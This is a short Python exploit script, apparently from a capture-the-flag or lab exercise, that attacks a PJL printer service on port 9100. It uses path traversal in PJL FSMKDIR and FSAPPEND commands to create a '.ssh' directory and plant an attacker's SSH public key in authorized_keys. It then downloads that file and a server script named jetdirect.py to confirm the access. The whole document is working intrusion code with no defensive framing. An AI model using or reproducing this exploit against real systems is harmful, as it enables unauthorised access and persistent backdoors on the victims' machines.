#!/usr/bin/env python3
import socket

KEY = b"ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHd2jjZHAM69tyxWab23os5aDLAjABySY04Zxxw14x41 kali@kali\n"
PATH = "../.ssh/authorized_keys"
N = len(KEY)


def recv_all(s: socket.socket, limit: int = 65536) -> bytes:
    out = b""
    try:
        while len(out) < limit:
            c = s.recv(4096)
            if not c:
                break
            out += c
    except socket.timeout:
        pass
    return out


def upload() -> None:
    s = socket.socket()
    s.settimeout(10)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSAPPEND NAME="{PATH}" SIZE={N}\r\n'.encode())
    r1 = recv_all(s, 256)
    print("1", repr(r1))
    if b"OK" in r1 or r1 == b"":
        s.sendall(KEY)
        r2 = recv_all(s, 256)
        print("2", repr(r2))
    s.close()


def download_jet() -> None:
    s = socket.socket()
    s.settimeout(15)
    s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSDOWNLOAD NAME="jetdirect.py" SIZE=5119\r\n')
    r1 = recv_all(s, 256)
    print("dl1", repr(r1))
    r2 = recv_all(s, 6000)
    print("dl2_len", len(r2), r2[:200])
    s.close()


def download_key() -> None:
    s = socket.socket()
    s.settimeout(10)
    s.connect(("127.0.0.1", 9100))
    s.sendall(f'@PJL FSDOWNLOAD NAME="{PATH}" SIZE={N}\r\n'.encode())
    r1 = recv_all(s, 64)
    print("k1", repr(r1))
    r2 = recv_all(s, 512)
    print("k2", repr(r2))
    s.close()


for _ in range(1):
    s = socket.socket()
    s.settimeout(3)
    s.connect(("127.0.0.1", 9100))
    s.sendall(b'@PJL FSMKDIR NAME="../.ssh"\r\n')
    recv_all(s, 64)
    s.close()

upload()
download_key()
upload()
download_key()
download_jet()